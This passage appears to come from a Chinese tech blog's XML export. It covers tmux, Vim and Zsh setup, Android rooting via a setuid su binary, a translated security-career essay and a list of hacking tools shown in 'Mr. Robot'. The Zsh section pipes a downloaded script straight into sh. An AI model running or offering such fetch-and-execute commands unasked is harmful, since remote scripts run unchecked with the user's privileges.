Windows has two command shells: The Command shell and PowerShell. 与Linux不同的是，Windows为每个shell都做了一个可执行程序，如命令提示符是cmd.exe，而PowerShell是powershell.exe，所以在Windows中我们习惯说“打开命令提示符”或者“打开PowerShell”；而在Linux中，我们更习惯说“打开终端”。 值得注意的是，在Windows 10的最新版本中，微软推出了全新的Windows Terminal，用以取代老旧且功能匮乏的控制台窗口。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强大的autojump]]></title>
    <url>%2F2018%2F09%2F19%2Fautojump%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那么，你想在安全行业工作吗？]]></title>
    <url>%2F2018%2F09%2F18%2Fso-you-want-to-work-in-security%2F</url>
    <content type="text"><![CDATA[本文翻译自https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23 ，正文如下： 每隔一段时间，我就会收到一封来自陌生人的电子邮件，询问有关如何从事安全行业（计算机，信息，网络等等）的建议。这很棒！我们需要更多充满激情，富有创造力和勤奋工作的人，他们希望努力使技术更安全。它也是一种非常经济稳定的谋生方式。关于这个确切的话题还有很多其他帖子，但我会根据自己的经验提出一些高层次的想法。 警告：这不像电影。在安全方面工作并不像好莱坞所描绘的那样。我喜欢观看黑客风格的电影和节目，以获得幻想和逃避，但日常工作并不像在屏幕上看起来那样快速和性感（就我的经验来说）。现在，对于大多数职业来说都是如此，即使我从未花费一天时间在地下巢穴中解读流媒体代码，我仍然认为这是一个令人兴奋，重要，具有挑战性和有益的领域。 没有标准或完美的课程。安全是一个广泛的，跨学科的应用领域。有设计和构建安全系统的人，尝试破坏系统的人，尝试检测入侵的人以及介于两者之间的大量事物。如果我学到了什么，我就知道没有单一的，标准的或最好的准备路径。也许这会随着领域的成熟而改变，但我对此表示怀疑。它也不像其他需要认证的专业领域（例如医学，法律），这既可以是解放也可以是恐吓。独立于你如何获得它，你将受益于对应用计算机科学或计算机和软件的工作方式的强烈理解。许多应用计算机科学都是关于解决抽象层的问题，安全性通常是在这些抽象中找到有缺陷的假设……然后找出如何最好地修复（或利用）它们。我是通过从公立大学获得计算机科学工程学位来做到这一点的。对我来说，一些更有用的主题是操作系统，网络，计算机体系结构和编译器。除此之外，我也参加了我感兴趣的技术课程（例如数字信号处理，生物医学工程，人工智能），并通过学生俱乐部和实习中的项目工作探索了网络，隐私增强技术和（网络，客户端）应用安全方面的安全主题。你还将从了解使用技术的人（用户，客户等）的工作方式中获益。如果我能回到我的大学时代，我会参加一些心理学，社会学和人文因素课程。我与具有相似传统学术背景的专家（例如计算机工程，计算机科学，数学等学位）工作过。我也认识很多不太具有典型背景的人（例如化学，电影研究，心理学，平面设计）和一些在完成学位之前辍学的人。关于安全认证的话题，我没有任何一个认证，我不认为我因此而被拒之门外。有些行业或国家可能会要求他们为信息安全专业人士提供服务，他们肯定是一些合理的人所追求的 - 告诫者！在文化方面，我建议阅读黑客宣言或如何成为一名黑客，这对许多安全专家来说都是灵感和道德的指南针。 即使你不把自己比作黑客，理解和你一起工作的一些人的心态也是有帮助的。除此之外，我所知道的大部分知识都是随着时间的推移，从朋友和同事的轶事，安全博客，会议论文和演示文稿，邮件列表，本地安全组和其他在线资源中学到的。我今天听到或摄取的很多东西都来自我的Twitter安全列表上的人。 停止阅读，开始做。这适用于任何职业追求，但尽可能快地获得一些真实的工作经验。这是缩小你的兴趣，优势和未来发展领域的最佳方式。你还可以更好地了解正常工作日和环境的组成，包括你喜欢和不喜欢的内容。我生命中最有价值的职业相关经历之一是做了一个我讨厌的实习，因为它，所以我强烈地转向了另一个方向:)在如何开始获得经验方面，我没有一个简单的答案。查看招聘会和会议，参与俱乐部或其他组织，以大胆的热情申请实习和兼职工作。在来谷歌之前，我在一个特许摊位清理干燥的nacho奶酪，这是我作为社区游泳池救生员定期轮班的一部分。这一点工作经验帮助我获得了大学宿舍管理员的工作，这在一家大型制药公司的IT实习面试时无疑是相关的。我在大学的俱乐部获得了一些“真实”（即非课程）软件体验，并且我在学校新闻组上发现了一个网络安全实习机会，这可能给了我足够的相关工作经验，让谷歌的某个人考虑为我安排一个面试。 写代码。我认识的最好的安全工程师也在积极编写代码。这为他们提供了编写软件的第一手经验，包括无意中但不可避免地引入了安全漏洞。后者迫使所有开发者真正感同身受。毕竟，一直编写安全代码通常比指出不安全的代码更难。如果你坚持从一个大型项目开始，请尝试修复开源项目中的错误。每个人都喜欢修复bug的人！该项目将感谢你，这通常是一种获得真实体验的好方法，也是你未来工作的好方法。 破坏代码。花时间寻找软件bug。了解如何使用调试器，网络扫描程序，Web调试代理和软件模糊测试。花时间在黑客游乐场，可用于所有技能水平。我在大学时第一次使用https://www.hackthissite.org ，并在https://infosec.rocks 列出了其他一些自我指导的黑客培训网站。还有一个很好的黑客挑战、比赛列表（例如CTF），不想浪费时间的人可以点这里。或者查找并报告你使用的实际软件中的bug。有许多软件供应商为安全漏洞提供现金奖励，包括Chrome和Google，以及Internet Bug Bounty计划涵盖的一些核心开源项目。除了自己找到错误之外，我还建议你继续学习并了解其他人的发现（bugtraq，fulldisclosure，oss-sec）。 分享知识。我开始了解安全是从大学中由同龄人组织的一个名为SigMil的特别有趣的ACM小组中，成员们会对他们感兴趣的安全主题进行粗略的演示。我们还参加了一年一度的DEFCON朝圣之旅，参加会谈（十年前要做的事情要容易得多），购买安全书籍或杂志，或者只是与来自世界其他地方的志同道合的人聊聊他们的工作。在Google，我直接从同行那里学到了很多东西，分享他们的专业知识，斗争和半生不熟的想法。分享知识很重要，原因如下： 分享知识是在大型组织或项目中扩展最佳安全实践（或避免陷阱）的必要且有效的方法。 我几乎总是在准备演示文稿或编写文档时自己学习一些东西，因此对于我来说，发现一个主题的隐藏角落是一个很好的强制功能。 我几乎总是从读者那里学到一些东西，无论是问题，评论还是后续讨论。 把爱传出去。 练习你的沟通。在安全方面工作意味着你需要定期向不同的受众解释复杂的技术问题，每个受众都有不同的词汇，专业知识和激励措施。在描述漏洞的严重性时，你很少会依赖通用指标，在推广最佳安全实践时也不会有任何闪亮的东西。面对FUD(即恐惧、不确定、怀疑)，你必须让人们不受欢迎，然后专注于危机之外的行动。所有这些都需要沟通艺术方面的技能，特别是解释和谈判。你不可能从纯粹的技术资源中掌握这门艺术，所以练习，发表，并永远致力于改进。 期望努力工作，有时会失败。也许这很明显，但值得明确表示。安全是挑战性工作。你需要不断学习新事物，因为你需要保护的技术环境正在快速发展，这比我们弃用旧的，尚未完全安全的内容的能力要快得多。经常有时间和资源的威胁行动者也能很快适应现有的防御。安全可能会有压力。你正在处理模棱两可的问题，不完善的解决方案，有限的数据以及对人类安全的真正威胁。很难用安全性衡量成功，根据我的经验，人们更有可能注意到失败。 在确保现实世界技术的同时，我们最终还是在减轻风险的过程中，无论RSA供应商的某个人告诉你什么，都没有银弹。 （尝试）保持乐观。由于我刚才概述的一些原因，这个领域可能令人沮丧。跟上技术和开发的创新速度似乎是不可能的。 我的意思是，缓冲区溢出漏洞已存在数十年，但我们今天（2016）仍然经常看到利用它们的高影响漏洞。你会经常听到人们尖叫安全是不可能的，而且情况正在恶化，或者说出我们为什么都失败的完全雄辩点。现实可能是苛刻的，但如果我们专注于积极思考并考虑技术所提供的所有东西，那真是令人印象深刻！这不完美。它永远不会是完美的。但我认为当今安全的最前沿比10年前要好得多，我们可以通过一定程度的合理保证做一些相当令人印象深刻的事情，这让我感到乐观。 请求帮忙。如果你遇到混蛋，不要气馁。多年来，我在信息安全行业看到了大量的沙文主义和自我主义者。通过对话（在线，会议等等）快速变成谁是最精英的人并不罕见。也许这不是每个人的经历，但我在很大程度上取得了成功，这得益于我现在认为是朋友的许多优秀安全人员的支持，建议，指导和帮助。仅仅因为你必须寻求帮助并不意味着你不会因为这项工作而被裁掉。如果您需要帮助，请尽管问。只要确保你做尽职调查，尽可能让人们帮助你。大多数专家都非常忙碌，所以如果你问一个有足够背景和没有拼写错误的好问题，你就更有可能获得有用的回应。 祝你好运并且快乐Hacking！我偶然发现了一些其他安全职业建议的想法： Thomas Ptacek，Charlie Miller，Jeremiah Grossman，Richard Bejtlich和Bruce Schneier分享了他们的想法http://krebsonsecurity.com/tag/security-career-advice/ 我的朋友并且是Chrome同事Chris Palmer分享了可靠的建议https://noncombatant.org/2016/06/20/get-into-security-engineering Michal Zalewski（又叫做lcamt​​uf）根据他在安全方面20年（令人敬畏的，经常是开创性的）的工作分享了4个简单的经验：https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html 译者注本文作者为Parisa Tabriz，她是计算机安全专家，曾在谷歌担任工程总监。由于她在黑客和互联网安全方面的经验，她被称为谷歌的“安全公主”。2012年，“福布斯”杂志将她列入“30位30岁以下技术行业观察人员”名单。]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《黑客军团》中使用的软件]]></title>
    <url>%2F2018%2F09%2F18%2Fsoftware-used-in-mr-robot%2F</url>
    <content type="text"><![CDATA[本文翻译自https://alternativeto.net/list/66/software-used-in-mr-robot ，正文如下： 本文盘点了获得艾美奖和金球奖剧情/惊悚系列电视剧——《黑客军团》中黑客使用的软件。下面的列表包含到了第二季第11集！ Kali LinuxKali Linux是针对安全研究人员进行渗透测试的Linux发行版，但同时也被黑客使用，因为它集成了很多黑客工具。由于它是黑客的首选操作系统，所以它在《黑客军团》中经常有过出现。 WickrWickr是一个端到端的加密聊天应用程序，具有诸如消息可调到期时间等功能。在第二季中，fsociety组织使用它来保密通信。 Tor BrowserTor浏览器被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，当第二季第8集中fsociety的成员Trenton用Tor浏览器向Vimeo上传一个泄露的关于非法群体监视的FBI电话会议时，利用到了它。 Raspberry Pi树莓派是一个小型的，可编程的计算机板，旨在教孩子们学习计算机科学。由于它的低成本，多功能性和简单性，它也是业余爱好者和程序员的最爱。第一季第5集中Elliot将一个树莓派安装到铁山的气候控制系统中，以便fsociety后期可以远程升高存储E公司磁带备份的存储空间的温度，从而实现美国消费者债务的很大一部分记录的备份被销毁。 FileZillaFileZilla是世界上最流行的FTP客户端，并且是最强大和用户友好的客户端之一。在第一季第4集中Trenton使用FileZilla上传一个漏洞利用程序到fsociety的FTP服务器上，即Elliot将安装在铁山的气候控制系统中的树莓派，以销毁美国消费者债务中很大一部分的记录。 PwnixPwnix是一个为渗透测试人员定制的用于网络黑客和安全的Android ROM。Elliot在第二季第9集中使用了一个Pwnie Express Pwn Phone（Pwnix预装），以至于他和Darlene渗透进黑暗军团的电话。 DeepSound在第一季第8集中，Elliot使用DeepSound将文件隐藏在CD的常规音乐曲目中，以便隐藏文件只能使用DeepSound软件查看。这是一种被称为隐写术的技术。 ProtonMailProtonMail是一个安全的端到端加密电子邮件服务，基于瑞士，Elliot在第一季第8集中使用过。《黑客军团》背后的团队研究安全电子邮件服务的程度很深，以至于他们实际上联系了ProtonMail开发者，询问用户是否有可能在ProtonMail中监控他们自己的电子邮件活动。ProtonMail开发者非常喜欢帐户访问日志的想法，他们最终在ProtonMail的v2.0版本中实现了这个功能。想要了解更多请访问：https://protonmail.com/blog/protonmail-mr-robot-secure-email/ HDShredderHDShredder 4企业版在第一季第10集中用于在E公司被黑之后安全地擦除所有fsociety的硬盘信息，然后他们在狗狗火葬场焚烧所有的硬盘。 John the RipperJohn the Ripper是Kali Linux中包含的一个密码破解工具，用于检测简单的Unix密码，并试图通过每秒数千次的猜测来破解它们。这被称为暴力破解，Elliot在第一季第2集中通过使用它来破解E公司的临时首席技术官Tyrell Wellick的邮箱密码。 WegtWget是一个命令行工具，可以发出HTTP(S)请求。在《黑客军团》中它被用于与John the Ripper结合使用Shellshock漏洞来攻击E公司的邮件服务器。 Social-Engineer ToolkitSET是一个专注于诸如网络钓鱼等社会工程攻击的测试框架。社会工程学欺骗受害者给予攻击者敏感信息。在第一季第5集中，Mobley使用SET的伪造短信功能让主管离开铁山，以便Elliot可以渗透进去。 OpenWrtOpenWrt是Angela在第二季第6集中黑进FBI时使用的路由器固件。 mimikatzmimikatz是一个后渗透工具，它将黑客可能需要执行的一些有用任务捆绑在一起。在第二季第6集中，它被装在USB橡皮鸭中并交给Angela，作为一个备份计划。 btscannerbtscanner是一个包含在Kali Linux中的工具，它可以在无需配对的情况下提取关于蓝牙设备的尽可能多的信息。在第一季第6集中，Elliot使用btscanner与Bluesniff和Metasploit结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 BluesniffBluesniff是一款蓝牙设备发现工具。在第一季第6集中，Elliot使用Bluesniff与Metasploit和btscanner结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 KVM(Kernel-base Virtual Machine)KVM是一个管理程序，它是一个可以通过虚拟机运行其他操作系统的软件。Elliot使用KVM在Kali Linux内虚拟化Windows 7。在第一季第8集中，它使用KVM运行DeepSound。 MetasploitMetasploit框架是Kali Linux中包含的一个软件，可以使渗透测试人员更容易发现网络中的漏洞。Meterpreter是可以在Metasploit框架中运行的数百个Payload之一，并且在第一季第6集中使用到。在第一季第6集中，Elliot使用Metasploit Framwork和Metapreter与btscanner和Bluesniff结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 Framaroot在电视中称为RooterFrame的Framaroot，在第一季第3集中被Tyrell Wellick用来Root同事的Android手机，这样他就可以隐藏在手机上安装的FlexiSPY间谍软件，以便获得关于谁将成为E公司的下一任首席技术官的秘密信息。 Kingo RootTyrell Wellick在第一季第3集中使用Kingo Root来Root同事的Android手机，这样他就可以在手机上隐蔽地安装FlexiSPY间谍软件，以便获得有关谁将成为下一任E公司首席执行官的秘密信息。 FlexiSPYFlexiSPY是针对Android，iOS和BlackBerry的间谍软件，允许用户监控受害者手机上的所有活动。在第一季第3集中，Tyrell Wellick秘密地将其安装在同事的Android手机上，以获取有关谁将成为下一任E公司首席技术官的秘密信息。 SuperSUSuperSU是一个在已Root的Android手机上管理超级用户权限的应用程序。在第一季第3集中，Tyrell Wellick在同事的Android手机上秘密安装了FlexiSPY —— 它使用SuperSU为它自己提供超级用户访问 —— 以便获得有关谁将成为下一任E公司首席技术官的秘密信息。 can-utilscan-utils包含与汽车电脑有关的实用程序。其中一个工具被称为candump，它在《黑客军团》中被用于入侵汽车的电脑。 radareradare2是Tyrell Wellick在第二季第12集中使用的逆向工程框架。 PyCharmPyCharm是一个Python和Django的IDE（集成开发环境），它是一种代码编辑软件。Trenton在第一季第四集中使用它。 TorTor被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，这个版本 —— 不像Tor浏览器 —— 可以用来托管隐藏服务，这是只能通过Tor访问的站点，并且其物理服务器位置被Tor匿名网络隐藏。Ray通过Tor隐藏服务运行着一条“丝绸之路”，他希望Elliot在第二季第5集中进行网站迁移。 PuTTYPuTTY是用于连接到Linux服务器的客户端。Elliot在第二季第4集和第5集使用PuTTY连接到运行Kali Linux的VPS（虚拟专用服务器），以便他可以在Ray的计算机上使用安装在VPS上的IRC客户端与Darlene聊天。他还在第二季第5集中使用PuTTY，完成了Ray的“丝绸之路”网站的迁移。 Mozilla FirefoxElliot使用Firefox作为他的默认浏览器。Trenton在第二季第8集中使用了Firefox。 FFmpeg在第二季第8集中Trenton使用FFmpeg编码一个视频，其中包含一个泄露的关于进行非法大规模监视的FBI电话会议，并通过Tor浏览器向Vimeo上传。 SlackwareSlackware是1993年创建的一个Linux发行版，旨在提高设计的稳定性和简单性，并成为最“类Unix”的Linux发行版。Slackware最初是基于Softlanding Linux系统的，它已经成为许多其他Linux发行版的基础，尤其是SUSE Linux发行版的第一个版本，也是最早的发行版本。在第二季第10集中，当Elliot与黑暗军队达成拯救Darlene生命的交易时，Leon给了他一台安装有Slackware的笔记本电脑，用于将黑暗军队的项目移动到刚果。 VLC Media PlayerVLC媒体播放器被用于第二季第4集，当时Elliot和Darlene一起观看了虚假恐怖片《Careful Massacre of the Bourgeoisie》的VHS版本。VLC也被用于第二季第8集，当fsociety预览一个他们将上传的关于非法大规模监视的泄露的FBI电话会议视频时。 Wayback Machine由Internet Archive运营的Waybach Machine是一个包含超过4,900亿个网页副本的数据库。在第二季第8集中FBI特工Dominique DiPierro向Mobley透露，联邦调查局使用了Wayback Machine，以便将他的黑客把柄与他为DJ Mobley创建的旧的粉丝页面联系起来。 µTorrent第二季第4集达琳用μTorrent下载了虚假恐怖电影《Careful Massacre of the Bourgeoisie》的VHS版本。]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[谈谈Android的root]]></title>
    <url>%2F2018%2F09%2F18%2Fandroid-root%2F</url>
    <content type="text"><![CDATA[Android的内核是Linux，所以Android的root和Linux的root有些许关系，不妨先回顾一下Linux中是如何获取root的。 Linux相关在Linux中获得root权限有2个命令，su与sudo，sudo只是为了短暂的获得root权限以执行某些操作(superuser do)，而su其实是为了切换用户(switch user)，但当其不带参数直接执行时，默认为切换到root用户。使用sudo执行某些需要root权限的操作时，需要输入当前用户的密码；而直接使用su切换到root用户时，需要输入root用户的密码。在Linux中，文件的权限有rwx三种，即可读(read)、可写(write)、可执行(execute)，其中r又等于4，w等于2，x等于1。所以，如果一个文件同时具有rwx权限，那么它的权限位就等于7。 Android相关Android本身是不愿意让用户获得root权限的，所以Android中没有su或sudo这些命令。所以，获得root权限的第一步就是要把su命令拷贝到Android的/system/bin或/system/xbin目录下。但是拷贝之后并不能直接使用su命令，因为Android中su的运行机制和Linux中不同。在Android中只有root用户才能使用su命令，非root用户无权使用su命令。这其实是一个逻辑闭环：使用su命令可以切换到root，但只有root用户才可以使用su命令。好在Linux中文件的权限除了rwx三种之外，还有s权限，s代表当任何一个用户执行该文件时都拥有文件所有者的权限，换句话来说，如果一个文件的所有者是root，且它的执行权限标志位是s，那么不管谁执行这个文件，他执行的时候都是以root身份执行的。基于以上，Android获取root权限大致可以分为如下3步：12345678# 拷贝su到指定目录下cp /data/tmp/su /system/bin/# 将su所有者设为rootchown root:root su# 将su标志位设为-rwsr-xr-xchmod 4775 /system/bin/su 但是，除了上面第一步以外，剩下两步都需要root权限才能成功执行，这就又造成了一个逻辑闭环：即通过上面的代码可以获得root权限，但必须有root权限才能执行上面的代码。这时的解决办法就是寻找Android系统的漏洞，系统中有些进程是以root权限运行的，只有找出那些有漏洞的进程，然后利用缓冲区溢出让其执行我们上面的命令，即可完成root。所以，总的来说，Android获取root权限最重要的一步，就是寻找系统的漏洞，然后利用之。 术语了解了Android root的基本原理后，需要理清一些常用术语： 刷机Bootloader线刷卡刷Nexus的rootNexus系列作为Google的亲儿子，自然少不了root解决方案，目前root Nexus设备使用最多的软件是Nexus Root Toolkit(NRT)。请注意，此软件运行前会先进行更新，这会花费较长的时间，需要耐心等待。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux小记]]></title>
    <url>%2F2018%2F09%2F18%2Ftmux%2F</url>
    <content type="text"><![CDATA[tmux是一款优秀的终端复用工具，在Ubuntu下，使用sudo apt install tmux即可安装，输入tmux即可开始使用。与tmux相似的软件还有Screen等。 名词解释Session（会话）当输入tmux后，实际上创建了一个Session，你可以在这个Session里创建多个Window，在Window里创建多个Pane。 Window（窗口）Window是显示给你的一整片窗口，你可以创建多个Window，在一个Window里面你又可以创建多个Pane，以此来执行多个任务。 Pane（窗格/面板）Pane是tmux中的最小单位，每个Pane相当于一个终端。 一个常见的tmux运行效果可能如下图所示：其中，Window被分成了3个Pane，每个Pane之间通过Pane Border（面板分隔符）加以区分。Window底部则是Status Bar（状态栏），状态栏从左往右依次被分为左面板、窗口列表、右面板。按照上图所示，其中左面板显示了Session的名称，窗口列表则显示了当前Window的索引值和名称，最后右面板依次显示了计算机名称、时间、日期。 命令tmux命令拥有众多参数，如下所示： tmux -V：显示tmux版本号 tmux ls或tmux list-sessions：列出所有tmux Session tmux a或tmux attach：连接（attach）到上一次的Session tmux a -t 0：连接到名为0的Session tmux new -s basic或tmux new-session -s basic：新建名为basic的Session，若不指定-s参数，则默认按数字命名 tmux kill-session -t foo：删除名为foo的Session tmux kill-server：删除所有Session tmux source ~/.tmux.conf：重载配置文件 快捷键tmux中的绝大部分操作都需要一个快捷键前缀加上相应的指令，tmux中默认的快捷键前缀是Ctrl + b，举例来说，使用prefix + %可以将当前Window分为左右两个Pane，这实际上是说，先按下Ctrl + b，再按下%，即可完成操作。值得注意的是，tmux默认的快捷键前缀是很糟糕的，因为很多程序都会使用到Ctrl + b，但同时，快捷键前缀也是可以自定义的。常用的快捷键如下： Session prefix + d：离开（datach）当前Session，即退出tmux Window prefix + c：创建（create）一个新的Window prefix + n：切换到下一个（next）Window prefix + p：切换到上一个（previous）Window prefix + &amp;：关闭当前Window Pane prefix + %：将当前光标所在Pane分为左右两个Pane prefix + &quot;：将当前光标所在Pane分为上下两个Pane prefix + o：在多个Pane之间切换光标，或按上下左右键 prefix + x：关闭当前光标所在Pane prefix + ?：查看快捷键列表 prefix + :：进入命令行模式（类似Vim） prefix + 空格键：依次轮回使用tmux预定义的Pane布局 值得注意的是，当创建Session后，默认会创建一个Window，当创建Window后，默认会创建一个Pane。 .tmux.conf$HOME/.tmux.conf文件是tmux的配置文件，tmux在启动时会按照此文件中的命令进行相关配置，个人常用的配置如下：12345678# 设定快捷键前缀unbind-key C-bset-option -g prefix C-xbind-key C-x send-prefixset-option -g escape-time 0# 开启鼠标模式set -g mouse on 插件tmux支持许多插件，在安装插件之前最好先安装插件管理器TPM，使用如下命令即可下载TPM：1git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm 下载完之后，只需在.tmux.conf文件底部添加相关配置，然后进入tmux输入prefix + I，即可自动下载并安装相应的插件，升级插件可使用prefix + U。个人常用的插件如下：相应的，.tmux.conf文件中插件相关的配置项如下：123456789101112# 插件# List of pluginsset -g @plugin &apos;tmux-plugins/tpm&apos;set -g @plugin &apos;tmux-plugins/tmux-sensible&apos;# Other examples:# set -g @plugin &apos;github_username/plugin_name&apos;# set -g @plugin &apos;git@github.com/user/plugin&apos;# set -g @plugin &apos;git@bitbucket.com/user/plugin&apos;# Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)run -b &apos;~/.tmux/plugins/tpm/tpm&apos; 值得注意的是，在更改.tmux.conf文件后，应该重启tmux，或者重载配置文件。 更多有关tmux的更多使用技巧可以参考《tmux: Productive Mouse-Free Development》一书。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim小记]]></title>
    <url>%2F2018%2F09%2F18%2Fvim%2F</url>
    <content type="text"><![CDATA[在几乎所有的Linux发行版中，都会自带vi文本编辑器，而Vim（Vi IMproved）则是vi的一个增强版，大多数Linux中也都预装了Vim，若没有安装，可使用相应的包管理工具进行安装，具体而言，在Ubuntu中，使用sudo apt install vim即可安装。输入vim --version可以查看所使用的Vim版本，当前最新版本为Vim 8.x。值得注意的是，在有的系统中，vi命令实际是指向vim命令的一个链接，使用which vi即可证实。 在2015年，开源组织发布了Neovim项目，它是Vim的重构版本，需自行安装。另外，GVim是Vim的一个图形客户端。 三种模式Vim有许多模式，但常用的其实是普通模式、插入模式、命令行模式这三种。 普通模式（Normal）Vim启动后默认为普通模式，此时Vim编辑器左下角将依次显示文件名、行数、字符数，右下角将依次显示当前光标所在的行与列、当前屏幕显示的字数占文件总字数的百分比。在普通模式下可以使用相当多的快捷键来完成相应的操作，常用的命令如下： x：删除当前光标所在字符 dd：删除当前行 0：到行头 $：到行尾 u：撤销 插入模式（Insert）在普通模式下输入i(insert)，即可切换到插入模式，此时Vim编辑器左下角将显示-- INSERT --标识。在插入模式下，可完成输入文字等功能。最后，按下Esc键可退回普通模式。 命令行模式在命令行模式下可以输入会被执行的相关命令，例如执行命令(:键)、搜索命令(/键)或者过滤命令(!键)。此时，Vim编辑器左下角将显示输入的命令。在命令执行之后，Vim将返回到命令行模式之前的模式，通常是普通模式。在命令行模式下常使用的命令有： :wq：保存(write)并退出(quit) :1：跳转到第一行，类似的，跳转到第n行则为:n :set nu：显示行号(number)，类似的，:set nonu为不显示行号 :set ff=unix：设置文件为unix格式 vimrcVim有多个配置文件，当前用户的配置文件为用户家目录下的.vimrc隐藏文件，Vim启动时会按照该文件中的配置开启相应的功能。个人常做的基本配置项如下：123456789101112131415161718192021222324252627282930&quot; 这是一行注释&quot; 显示行号set number&quot; 语法高亮syntax enable&quot; tab缩进set tabstop=4set shiftwidth=4set expandtabset smarttab&quot; 鼠标可用&quot;set mouse=a&quot; 配色方案set t_Co=256set background=darkcolorscheme desert&quot; 匹配模式set showmatch&quot; 自动缩进set autoindentset smartindent&quot; 显示命令set showcmd 主题Vim自带了多种主题，即配色方案，默认存放在Vim安装目录下的colors文件夹下，在Vim中输入命令:echo $VIMRUNTIME即可显示Vim的安装目录，以我的为例，其安装目录为/usr/share/vim/vim80。 如果你想更改默认的主题，可以按照上面的配置，在vimrc文件中使用colorscheme &lt;主题名&gt;进行配置。Vim默认使用的是default主题。如果你想使用第三方或自定义的主题，则需要将下载的主题文件存放到colors文件夹下（~/.vim/colors下也行），然后再进行相关配置。 插件Vim支持很多插件，为了简化插件的安装，由此诞生了许多的插件管理器，Vundle是使用最多的Vim插件管理器，但个人倾向于使用vim-plug插件管理器，vim-plug相比Vundle最大的优势是支持异步安装，该特性可以极大的加速多个插件的安装速度。使用如下命令即可安装vim-plug：12curl -fLo ~/.vim/autoload/plug.vim --create-dirs \ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim 安装完vim-plug插件管理器后，只需在.vimrc文件中做相关配置，然后进入Vim的命令行模式，输入:PlugInstall命令，即可自动下载并安装相应的插件，升级插件可使用:PlugUpdate命令，升级vim-plug本身，可使用:PlugUpgrade命令。个人常用的插件如下： NERDTree：显示文件树形目录 YouCompleteMe：代码自动补全 startify：自定义起始页 相应的，.vimrc文件中插件相关的配置项如下：123456789101112131415161718&quot; vim-plugcall plug#begin(&apos;~/.vim/plugged&apos;)function! BuildYCM(info) &quot; info is a dictionary with 3 fields &quot; - name: name of the plugin &quot; - status: &apos;installed&apos;, &apos;updated&apos;, or &apos;unchanged&apos; &quot; - force: set on PlugInstall! or PlugUpdate! if a:info.status == &apos;installed&apos; || a:info.force !./install.py endifendfunctionPlug &apos;Valloric/YouCompleteMe&apos;, &#123; &apos;do&apos;: function(&apos;BuildYCM&apos;) &#125;Plug &apos;scrooloose/nerdtree&apos;, &#123; &apos;on&apos;: &apos;NERDTreeToggle&apos; &#125;Plug &apos;mhinz/vim-startify&apos;call plug#end()]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Zsh替代Bash]]></title>
    <url>%2F2018%2F09%2F18%2Fzsh%2F</url>
    <content type="text"><![CDATA[众所周知，Bash几乎是所有Linux发行版预装的Shell，但Zsh却能带给你更强大的功能。 安装Zsh的安装很简单，在Ubuntu中，只需要sudo apt install zsh一条命令即可，启用也很简单，chsh -s $(which zsh)即可，但它的配置却相当复杂，由此诞生了Oh My Zsh项目，该项目的主要目的是简化Zsh的配置。Oh My Zsh的官网给出了利用curl或wget安装的详细命令，具体如下：12345# 安装Oh My Zsh前需要安装git（`sudo apt install git`）# 通过curl安装sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"# 通过wget安装sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" 安装完成后，会在当前用户的家目录下生成多个隐藏文件：其中.zshrc类似于.bashrc，存放zsh的配置信息；.zsh_history类似于.bash_history，存放zsh的命令历史记录；.oh-my-zsh的文件夹则是Oh My Zsh项目GitHub仓库的克隆版，其中的themes文件夹下主要存放自带的主题，plugins文件夹下主要存放自带的插件，custom文件夹下主要存放用户自己下载的主题和插件。 配置Oh My Zsh的主要配置都位于$HOME/.zshrc文件中，主要配置如下：1234567891011121314151617# 配置主题，默认为自带的robbyrussell主题，# 个人喜欢自带的ys主题ZSH_THEME="ys"# 启动错误命令自动更正，默认是注释的ENABLE_CORRECTION="true"# 在命令执行的过程中，使用小红点进行提示# 默认是注释的COMPLETION_WAITING_DOTS="true"# 配置插件，默认只启用了自带的git插件,# 要启用更多的插件可直接在括号中写入，# 必须是自带的插件或已下载到指定位置的插件plugins=( git) 插件Zsh的强大之处就在于它有相当多的插件，只需安装相关插件，并进行配置，即可体验相应功能。Oh My Zsh安装并启用插件相当简便，所以，可把Oh My Zsh当成是一个Zsh的插件管理器。个人常用的插件如下： gitOh My Zsh自带的插件，用于显示Git仓库的分支等信息。 autojumpOh My Zsh自带的插件，实现快速跳转到指定文件夹，前提是要安装autojump命令行工具，sudo apt install autojump即可。 zsh-autosuggestionsZsh下的命令自动建议插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions zsh-completionsZsh下的命令自动补全插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions zsh-syntax-highlightingZsh下的命令语法高亮插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 